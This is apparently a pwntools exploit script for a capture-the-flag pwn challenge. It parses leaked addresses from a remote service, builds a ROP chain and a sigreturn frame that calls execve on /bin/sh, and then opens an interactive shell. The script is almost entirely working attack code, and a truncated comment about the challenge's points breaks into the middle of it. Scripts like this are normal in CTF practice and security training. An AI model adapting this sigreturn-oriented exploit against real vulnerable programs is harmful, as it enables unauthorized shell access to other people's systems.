from pwn import *

target = remote('0.cloud.chals.io', 21978)

context.arch = "amd64"

frame = SigreturnFrame()

print(target.recvuntil(b'Push your way to /bin/sh at :'))

leak = (target.recvline())
print(leak)
binsh = int(leak, 16)
print('binsh is at', hex(binsh))

payload = b'Y'
target.send(payload)
print(target.recvuntil(b'Would you like another push (Y/*) >>>'))
target.sendline(b'Y')

print(target.recvuntil(b'Would you like another push (Y/*) >>>'))
target.sendline(b'Y')
print(target.recvuntil(b'~ push 0x58585858; ret |'))
leak = (target.recvline())
print(leak)

pop_rax = int(leak, 16) + 4
print('pop rax ret at ', hex(pop_rax))

print(target.recvuntil(b'Would you like another push (Y/*) >>>'))
target.sendline(b'Y')
print(target.recvuntil(b'~ push 0x0f050f05; ret |'))
leak = (target.recvline())
print(leak)
syscall = int(leak, 16) + 2

print('syscall at', hex(syscall))

print('adjusted pop rax and syscall to be correct')

pop_rax += 2
syscall += 2

padding = b'a' * 16 

payload = padding + p64(pop_rax) + p64(0xf) + p64(syscall)
#By the end of the competition, the challenge was worth 496 points with a total of 12 solvers. This made 
frame.rip = syscall
frame.rdi = binsh 
frame.rax = 59
frame.rsi = 0
frame.rdx = 0

payload += bytes(frame)

target.sendline(payload)

target.interactive()